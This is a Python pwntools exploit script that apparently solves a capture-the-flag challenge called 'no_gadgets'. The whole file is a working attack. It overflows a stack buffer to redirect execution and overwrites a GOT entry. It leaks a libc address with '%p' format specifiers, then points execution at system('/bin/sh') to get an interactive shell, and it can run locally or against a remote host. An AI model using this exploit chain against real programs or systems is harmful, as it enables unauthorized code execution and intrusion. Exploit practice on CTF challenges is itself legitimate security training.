#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('no_gadgets')
libc = exe.libc
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x401275
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 0x80

    payload = b"\x00" + flat({
        offset-1: [
            exe.got["puts"] + 0x80,
            0x0000000000401016,
            exe.sym["main"] + 68
        ]
    })

    io.sendline(payload)

    payload = b"%p"*4
    payload += p64(exe.sym["main"] + 58)
    payload += p64(0x000000401056)
    payload += p64(0x000000401066)
    payload += p64(0x000000401076)
    payload += p64(0x000000401086)

    io.sendline(payload)

    io.recvuntil(b"scratch!")
    leak = io.recv().split(b"\n")[1][:14]
    libc.address = int(leak, 16) - 0x219b23
    info("libc base: %#x", libc.address)

    payload = b"/bin/sh\x00"
    payload += p64(libc.sym["system"])

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

